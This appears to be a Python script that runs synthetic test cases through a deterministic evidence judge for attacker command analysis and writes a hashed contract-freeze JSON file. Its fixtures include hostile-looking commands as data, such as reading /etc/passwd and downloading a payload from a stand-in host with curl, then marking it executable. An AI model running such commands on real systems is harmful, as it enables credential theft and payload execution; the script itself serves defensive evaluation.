from __future__ import annotations

import hashlib
import json
from pathlib import Path

from ragin.don.evidence_judge import DeterministicEvidenceJudge, judge_bundle

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "results/evidence_judge/evidence_judge_contract_freeze_v1.json"


def candidate(doc_id: str, title: str, content: str, *, source: str = "synthetic://fixture", status: str = "VALID") -> dict[str, object]:
    return {
        "doc_id": doc_id,
        "title": title,
        "content": content,
        "source": source,
        "provenance_status": status,
        "command_patterns": [title],
        "behavior_tags": ["discovery"],
    }


def cases() -> list[dict[str, object]]:
    judge = DeterministicEvidenceJudge()
    inputs = [
        ("relevant", "uname -a", [], [candidate("d1", "uname", "Direct host discovery evidence.")]),
        ("adjacent", "uname -a", [], [candidate("d1", "crontab", "Persistence evidence.")]),
        ("partial", "cat /etc/passwd", [], [candidate("d1", "accounts", "Related passwd context.")]),
        ("conflicting", "curl http://example.invalid/payload", [], [candidate("d1", "curl", "Direct download evidence."), candidate("d2", "curl", "This contradicts the observed download behavior.")]),
        ("ambiguous", "echo 'unterminated", [], [candidate("d1", "echo", "Related output context.")]),
        ("multi_command", "chmod +x /tmp/x", ["curl http://example.invalid/x -o /tmp/x"], [candidate("d1", "chmod", "Direct execution preparation evidence.")]),
        ("missing_provenance", "ssh admin@example.invalid", [], [candidate("d1", "ssh", "Direct remote access evidence.", source="", status="UNKNOWN")]),
        ("unsupported", "echo hello", [], [candidate("d1", "ssh", "Remote access evidence.")]),
        ("safe_abstention", "", [], []),
    ]
    result = []
    for case_id, command, preceding, documents in inputs:
        trace = judge_bundle(command, documents, preceding_commands=preceding, judge=judge)
        result.append({"case_id": case_id, "command": command, "preceding_commands": preceding, "trace": trace})
    return result


def sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def main() -> None:
    source_files = [
        "ragin/don/evidence_judge.py",
        "ragin/don/__init__.py",
        "ragin/decision_fusion_v4/evidence_export.py",
        "ragin/decision_fusion_v4/benchmark.py",
        "tests/unit/test_evidence_judge.py",
        "docs/evidence_judge/EVIDENCE_JUDGE_CONTRACT_V1.md",
        "scripts/freeze_evidence_judge_contract.py",
    ]
    payload = {
        "freeze_schema": "ragin.evidence_judge.contract_freeze.v1",
        "status": "EVIDENCE_JUDGE_CONTRACT_READY",
        "historical_evaluations_reused": False,
        "model_inference_used": False,
        "paid_api_used": False,
        "aws_changed": False,
        "captured_commands_executed": False,
        "synthetic_cases": cases(),
        "source_sha256": {path: sha256(ROOT / path) for path in source_files},
    }
    encoded = json.dumps(payload, sort_keys=True, separators=(",", ":")).encode()
    payload["freeze_sha256"] = hashlib.sha256(encoded).hexdigest()
    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text(json.dumps(payload, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    print(json.dumps({"path": str(OUT.relative_to(ROOT)), "freeze_sha256": payload["freeze_sha256"], "cases": len(payload["synthetic_cases"])}, sort_keys=True))


if __name__ == "__main__":
    main()
